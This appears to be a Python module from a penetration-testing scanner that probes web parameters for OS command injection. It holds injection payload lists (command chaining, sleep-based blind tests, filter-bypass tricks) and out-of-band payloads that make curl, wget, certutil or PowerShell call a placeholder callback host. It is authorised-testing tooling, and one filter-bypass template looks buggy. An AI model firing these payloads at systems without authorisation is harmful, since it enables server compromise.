"""
Jarwis AGI Pen Test - OS Command Injection Scanner
Detects OS Command Injection vulnerabilities (A03:2021 - Injection)

Based on PortSwigger Web Security Academy: https://portswigger.net/web-security/os-command-injection

Attack Techniques:
- Basic command injection (;, |, &, ||, &&)
- Blind command injection (time-based)
- Out-of-band command injection (OOB callbacks)
- Filter bypass techniques (encoding, newlines, command substitution)

Usage:
    scanner = CommandInjectionScannerV2(
        http_client=jarwis_http_client,
        request_store=request_store_db,
        checkpoint=checkpoint,
        token_manager=token_manager,
        oob_server=oob_callback_server  # Optional for blind detection
    )
    findings = await scanner.run(post_login=True)
"""

import asyncio
import logging
import re
import uuid
from typing import Dict, List, Optional, Any, Tuple

from attacks.web.base_attack_scanner import (
    BaseAttackScanner,
    Finding,
    Severity,
    Confidence
)
from attacks.payloads.manager import PayloadManager, PayloadCategory
from core.jarwis_http_client import JarwisHTTPClient, AttackResponse
from core.request_store_db import RequestStoreDB, StoredRequest
from core.scan_checkpoint import RequestLevelCheckpoint
from core.token_manager import TokenManager

logger = logging.getLogger(__name__)


class CommandInjectionScannerV2(BaseAttackScanner):
    """
    OS Command Injection Scanner (MITM-based)
    
    OWASP A03:2021 - Injection
    CWE-78: Improper Neutralization of Special Elements used in an OS Command
    
    Attack vectors:
    - Basic inline command injection
    - Blind time-based command injection
    - Out-of-band (OOB) command injection
    - Command substitution attacks
    - Filter bypass techniques
    
    All requests go through MITM via JarwisHTTPClient.
    """
    
    # Scanner identification
    scanner_name = "command_injection"
    attack_type = "command_injection"
    owasp_category = "A03:2021"
    cwe_id = "CWE-78"
    
    # Unique markers for detection
    CANARY_PREFIX = "jarwis"
    MATH_RESULT = "489"  # Result of expr 163 + 326
    
    # Command separators for different OS
    SEPARATORS = {
        'universal': [';', '|', '||', '&&', '\n', '\r\n', '`'],
        'unix': ['$()', '`'],
        'windows': ['&', '|', '%0a'],
    }
    
    # Basic command injection payloads (inline - response-based detection)
    BASIC_PAYLOADS = [
        # Simple command chaining
        "; echo {canary}",
        "| echo {canary}",
        "|| echo {canary}",
        "&& echo {canary}",
        "& echo {canary}",
        
        # Newline injection
        "%0aecho {canary}",
        "%0d%0aecho {canary}",
        "\necho {canary}",
        
        # Command substitution (Unix)
        "$(echo {canary})",
        "`echo {canary}`",
        
        # Math operations for unique output
        "; expr 163 + 326",
        "| expr 163 + 326",
        "$(expr 163 + 326)",
        "`expr 163 + 326`",
        
        # Windows specific
        "& echo {canary}",
        "| set /p={canary}",
        
        # Quote escaping
        "'; echo {canary}; '",
        '"; echo {canary}; "',
        "'; echo {canary}; #",
        
        # Common vulnerable patterns
        "127.0.0.1; echo {canary}",
        "127.0.0.1 | echo {canary}",
        "test.txt; echo {canary}",
        "1; echo {canary}",
    ]
    
    # Time-based blind payloads (Unix/Windows)
    TIME_PAYLOADS = {
        'unix': [
            "; sleep {delay}",
            "| sleep {delay}",
            "|| sleep {delay}",
            "&& sleep {delay}",
            "$(sleep {delay})",
            "`sleep {delay}`",
            "'; sleep {delay}; '",
            '"; sleep {delay}; "',
            "%0asleep {delay}",
            "127.0.0.1; sleep {delay}",
            # Ping-based (5 packets = ~5 seconds)
            "; ping -c {delay} 127.0.0.1",
            "| ping -c {delay} 127.0.0.1",
        ],
        'windows': [
            "& ping -n {delay_plus_1} 127.0.0.1",
            "| ping -n {delay_plus_1} 127.0.0.1",
            "&& ping -n {delay_plus_1} 127.0.0.1",
            "|| ping -n {delay_plus_1} 127.0.0.1",
            "& timeout /t {delay}",
            "| timeout /t {delay}",
        ],
    }
    
    # OOB (Out-of-Band) payloads - requires callback server
    OOB_PAYLOADS = {
        'unix': [
            "; curl http://{callback_host}/{token}",
            "| wget http://{callback_host}/{token}",
            "$(curl http://{callback_host}/{token})",
            "`wget http://{callback_host}/{token}`",
            "; nslookup {token}.{callback_host}",
            "| dig {token}.{callback_host}",
            "$(nslookup {token}.{callback_host})",
        ],
        'windows': [
            "& nslookup {token}.{callback_host}",
            "| nslookup {token}.{callback_host}",
            "& certutil -urlcache -f http://{callback_host}/{token} NUL",
            "| powershell Invoke-WebRequest http://{callback_host}/{token}",
        ],
    }
    
    # Filter bypass payloads
    FILTER_BYPASS_PAYLOADS = [
        # Space bypass
        ";{IFS}echo{IFS}{canary}",
        ";echo${IFS}{canary}",
        ";echo%09{canary}",  # Tab
        
        # Quote tricks
        "';'echo {canary}",
        '";\'echo {canary}',
        
        # Concatenation bypass
        ";ec''ho {canary}",
        ";ec\"\"ho {canary}",
        ";e\\cho {canary}",
        
        # Variable injection
        ";a=ec;b=ho;$a$b {canary}",
        
        # Hex encoding
        ";$(printf '\\x65\\x63\\x68\\x6f') {canary}",  # echo
        
        # Base64 encoded commands
        ";echo {canary_b64}|base64 -d",
        
        # Wildcard bypass
        ";/???/??ho {canary}",  # /bin/echo
    ]
    
    # Parameters commonly vulnerable to command injection
    PRIORITY_PARAMS = [
        'cmd', 'command', 'exec', 'execute', 'ping', 'query', 'host',
        'hostname', 'ip', 'address', 'domain', 'port', 'file', 'filename',
        'path', 'filepath', 'dir', 'directory', 'folder', 'target', 'dest',
        'destination', 'src', 'source', 'url', 'uri', 'daemon', 'upload',
        'download', 'log', 'email', 'to', 'from', 'name', 'user', 'doc',
        'document', 'pdf', 'arg', 'argument', 'option', 'flag', 'process'
    ]
    
    def __init__(
        self,
        http_client: JarwisHTTPClient,
        request_store: RequestStoreDB,
        checkpoint: Optional[RequestLevelCheckpoint] = None,
        token_manager: Optional[TokenManager] = None,
        config: Optional[Dict[str, Any]] = None,
        oob_server: Optional[Any] = None
    ):
        super().__init__(http_client, request_store, checkpoint, token_manager, config)
        self.oob_server = oob_server
        self._canary = f"{self.CANARY_PREFIX}{uuid.uuid4().hex[:8]}"
        self._delay_seconds = config.get('delay_seconds', 5) if config else 5
        
        # Initialize PayloadManager for external payload loading
        self._payload_manager = PayloadManager()
        self._external_payloads_loaded = False
        self._ext_basic_payloads: List[str] = []
        self._ext_time_payloads: List[str] = []
        self._ext_oob_payloads: List[str] = []
        self._ext_bypass_payloads: List[str] = []
    
    def _load_external_payloads(self) -> None:
        """Lazy-load payloads from external files."""
        if self._external_payloads_loaded:
            return
        
        try:
            self._ext_basic_payloads = self._payload_manager.get_payloads(
                PayloadCategory.CMDI, subcategory="basic", limit=50
            )
            self._ext_time_payloads = self._payload_manager.get_payloads(
                PayloadCategory.CMDI, subcategory="time_based", limit=30
            )
            self._ext_oob_payloads = self._payload_manager.get_payloads(
                PayloadCategory.CMDI, subcategory="oob", limit=30
            )
            self._ext_bypass_payloads = self._payload_manager.get_payloads(
                PayloadCategory.CMDI, subcategory="filter_bypass", limit=40
            )
            self._external_payloads_loaded = True
            logger.debug(f"Loaded {len(self._ext_basic_payloads)} basic, {len(self._ext_time_payloads)} time-based, {len(self._ext_oob_payloads)} OOB, {len(self._ext_bypass_payloads)} bypass payloads from external files")
        except Exception as e:
            logger.warning(f"Failed to load external payloads, using embedded: {e}")
    
    def get_payloads(self) -> List[str]:
        """Return basic payloads with canary substituted. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Prefer external payloads, fall back to embedded
        if self._ext_basic_payloads:
            payloads = self._ext_basic_payloads[:self.max_payloads_per_param]
        else:
            payloads = self.BASIC_PAYLOADS[:self.max_payloads_per_param]
        
        # Substitute canary marker
        return [p.replace('{canary}', self._canary) for p in payloads]
    
    def get_time_payloads(self, os_type: str = 'unix') -> List[str]:
        """Return time-based blind payloads. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Use external if available
        if self._ext_time_payloads:
            payloads = self._ext_time_payloads[:30]
        else:
            payloads = self.TIME_PAYLOADS.get(os_type, self.TIME_PAYLOADS['unix'])
        
        # Substitute delay markers
        return [
            p.replace('{delay}', str(self._delay_seconds))
             .replace('{delay_plus_1}', str(self._delay_seconds + 1))
            for p in payloads
        ]
    
    def get_oob_payloads(self, callback_host: str, token: str) -> List[str]:
        """Return OOB payloads. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Use external if available
        if self._ext_oob_payloads:
            payloads = self._ext_oob_payloads[:30]
        else:
            payloads = self.OOB_PAYLOADS.get('unix', []) + self.OOB_PAYLOADS.get('windows', [])
        
        # Substitute callback markers
        return [
            p.replace('{callback_host}', callback_host)
             .replace('{CALLBACK_HOST}', callback_host)
             .replace('{token}', token)
             .replace('{TOKEN}', token)
            for p in payloads
        ]
    
    def get_bypass_payloads(self) -> List[str]:
        """Return filter bypass payloads. Uses external payloads if available."""
        self._load_external_payloads()
        
        # Use external if available
        if self._ext_bypass_payloads:
            payloads = self._ext_bypass_payloads[:40]
        else:
            payloads = self.FILTER_BYPASS_PAYLOADS
        
        # Substitute canary marker
        import base64
        canary_b64 = base64.b64encode(self._canary.encode()).decode()
        return [
            p.replace('{canary}', self._canary)
             .replace('{canary_b64}', canary_b64)
            for p in payloads
        ]
    
    def is_applicable(self, request: StoredRequest) -> bool:
        """Check if this request should be tested for command injection."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters:
            return False
        
        # Prioritize requests with command injection-prone parameters
        param_names = [p.lower() for p in request.parameters.keys()]
        has_priority_param = any(p in ' '.join(param_names) for p in self.PRIORITY_PARAMS)
        
        return has_priority_param or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredRequest) -> List[Finding]:
        """
        Scan a single request for OS command injection vulnerabilities.
        
        Attack methodology:
        1. Get baseline response
        2. Test basic inline command injection
        3. Test time-based blind injection
        4. Test OOB injection (if callback server available)
        5. Test filter bypass techniques
        """
        findings = []
        
        # Get baseline response for comparison
        baseline = await self.send_baseline_request(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] Could not get baseline for {request.url}")
            return findings
        
        baseline_time_ms = baseline.response_time_ms
        
        # Test each parameter
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            # Determine injection locations
            locations = self._get_injection_locations(request, param_name)
            
            for location in locations:
                # 1. Basic inline command injection
                basic_finding = await self._test_basic_injection(
                    request, param_name, location, baseline
                )
                if basic_finding:
                    findings.append(basic_finding)
                    continue  # Found, skip other tests for this param
                
                # 2. Time-based blind injection
                time_finding = await self._test_time_based(
                    request, param_name, location, baseline_time_ms
                )
                if time_finding:
                    findings.append(time_finding)
                    continue
                
                # 3. OOB injection (if callback server available)
                if self.oob_server:
                    oob_finding = await self._test_oob_injection(
                        request, param_name, location
                    )
                    if oob_finding:
                        findings.append(oob_finding)
                        continue
                
                # 4. Filter bypass techniques
                bypass_finding = await self._test_filter_bypass(
                    request, param_name, location, baseline
                )
                if bypass_finding:
                    findings.append(bypass_finding)
        
        return findings
    
    def _get_injection_locations(
        self,
        request: StoredRequest,
        param_name: str
    ) -> List[str]:
        """Determine where to inject payloads for this parameter."""
        locations = []
        
        if '?' in request.url and param_name in request.url:
            locations.append('query')
        
        if request.body and param_name in request.body:
            locations.append('body')
        
        if not locations:
            if request.method.upper() == 'GET':
                locations.append('query')
            else:
                locations.append('body')
        
        return locations
    
    async def _test_basic_injection(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for basic inline command injection."""
        
        for payload_template in self.BASIC_PAYLOADS[:self.max_payloads_per_param]:
            payload = payload_template.format(canary=self._canary)
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for command output in response
            is_vulnerable, evidence, confidence = self.detect_vulnerability(
                response, payload, baseline
            )
            
            if is_vulnerable:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f"OS Command Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to OS command injection. "
                        f"The application executes user-supplied input as system commands. "
                        f"This can lead to complete server compromise, data theft, and lateral movement."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_time_based(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline_time_ms: float
    ) -> Optional[Finding]:
        """Test for time-based blind command injection."""
        
        delay = self._delay_seconds
        delay_plus_1 = delay + 1  # Windows ping needs n+1 for n seconds
        
        # Test both Unix and Windows payloads
        all_time_payloads = (
            [(p, 'unix') for p in self.TIME_PAYLOADS['unix'][:3]] +
            [(p, 'windows') for p in self.TIME_PAYLOADS['windows'][:2]]
        )
        
        for payload_template, os_type in all_time_payloads:
            payload = payload_template.format(delay=delay, delay_plus_1=delay_plus_1)
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check if response was delayed
            if self.check_time_based(response, baseline_time_ms, float(delay)):
                evidence = (
                    f"Baseline response: {baseline_time_ms:.0f}ms. "
                    f"With sleep payload: {response.response_time_ms:.0f}ms. "
                    f"Expected delay: {delay * 1000}ms. "
                    f"OS type: {os_type}"
                )
                
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence="confirmed",
                    severity="critical",
                    title=f"Blind Command Injection ({os_type}) in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to blind OS command injection. "
                        f"The {os_type} sleep/ping command caused a measurable delay ({delay}s). "
                        f"This confirms command execution on the target system."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_oob_injection(
        self,
        request: StoredRequest,
        param_name: str,
        location: str
    ) -> Optional[Finding]:
        """Test for out-of-band command injection using callback server."""
        
        if not self.oob_server:
            return None
        
        # Generate unique token for this test
        oob_token = f"cmd-{uuid.uuid4().hex[:12]}"
        
        try:
            callback_host = self.oob_server.get_callback_host()
        except Exception:
            return None
        
        # Combine Unix and Windows OOB payloads
        all_oob_payloads = (
            [(p, 'unix') for p in self.OOB_PAYLOADS['unix'][:2]] +
            [(p, 'windows') for p in self.OOB_PAYLOADS['windows'][:2]]
        )
        
        for payload_template, os_type in all_oob_payloads:
            payload = payload_template.format(
                callback_host=callback_host,
                token=oob_token
            )
            
            # Register expected callback
            try:
                self.oob_server.expect_callback(oob_token, timeout=10)
            except Exception:
                continue
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            # Wait briefly and check for callback
            await asyncio.sleep(2)
            
            try:
                if self.oob_server.check_callback(oob_token):
                    callback_data = self.oob_server.get_callback_data(oob_token)
                    evidence = (
                        f"OOB callback received from target server. "
                        f"Token: {oob_token}. "
                        f"Callback data: {callback_data}"
                    )
                    
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        evidence=evidence,
                        confidence="confirmed",
                        severity="critical",
                        title=f"OOB Command Injection ({os_type}) in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to out-of-band command injection. "
                            f"The server executed a {os_type} command that made an external callback "
                            f"to our monitoring server, confirming code execution."
                        ),
                        parameter=param_name
                    )
            except Exception:
                pass
        
        return None
    
    async def _test_filter_bypass(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test filter bypass techniques."""
        
        import base64
        canary_b64 = base64.b64encode(self._canary.encode()).decode()
        
        for payload_template in self.FILTER_BYPASS_PAYLOADS[:5]:
            payload = payload_template.format(
                canary=self._canary,
                canary_b64=canary_b64
            )
            
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            is_vulnerable, evidence, confidence = self.detect_vulnerability(
                response, payload, baseline
            )
            
            if is_vulnerable:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=f"Filter bypass successful. {evidence}",
                    confidence=confidence,
                    severity="critical",
                    title=f"Command Injection (Filter Bypass) in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to command injection "
                        f"using filter bypass techniques. Input validation was circumvented."
                    ),
                    parameter=param_name
                )
        
        return None
    
    def detect_vulnerability(
        self,
        response: AttackResponse,
        payload: str,
        original_response: Optional[AttackResponse] = None
    ) -> Tuple[bool, str, str]:
        """
        Analyze response for command injection indicators.
        
        Detection methods:
        1. Canary string in response
        2. Math result (489) in response
        3. Command error messages
        4. Significant response differences
        """
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        # 1. Check for canary string
        if self._canary in body:
            return True, f"Canary '{self._canary}' found in response", "confirmed"
        
        # 2. Check for math result
        if self.MATH_RESULT in body:
            # Verify it's our injected result, not existing content
            if original_response and self.MATH_RESULT not in (original_response.body or ''):
                return True, f"Math result '{self.MATH_RESULT}' appeared in response", "confirmed"
        
        # 3. Check for command error patterns
        error_patterns = [
            (r'sh: .*: command not found', 'Unix command not found'),
            (r'bash: .*: command not found', 'Bash command error'),
            (r'/bin/sh: .*: not found', 'Shell command error'),
            (r"'.*' is not recognized", 'Windows command error'),
            (r'The system cannot find', 'Windows file error'),
            (r'syntax error near unexpected token', 'Shell syntax error'),
            (r'missing operand', 'Command syntax error'),
            (r'No such file or directory', 'File not found (command context)'),
            (r'Permission denied', 'Command permission error'),
            (r'cannot execute binary file', 'Binary execution error'),
        ]
        
        for pattern, desc in error_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                # Check if error is new (not in baseline)
                if original_response and not re.search(pattern, original_response.body or '', re.IGNORECASE):
                    return True, f"Command error detected: {desc}", "high"
        
        # 4. Check for command output patterns
        output_patterns = [
            (r'uid=\d+\(.*\)\s+gid=\d+', 'Unix id command output'),
            (r'Linux.*GNU/Linux', 'Linux system info'),
            (r'root:.*:0:0:', 'Unix passwd file content'),
            (r'Directory of [A-Z]:\\', 'Windows dir output'),
            (r'Volume Serial Number', 'Windows volume info'),
            (r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*bytes', 'Ping output'),
        ]
        
        for pattern, desc in output_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                if original_response and not re.search(pattern, original_response.body or '', re.IGNORECASE):
                    return True, f"Command output detected: {desc}", "high"
        
        return False, "", ""


# Alias for backward compatibility
CommandInjectionScanner = CommandInjectionScannerV2
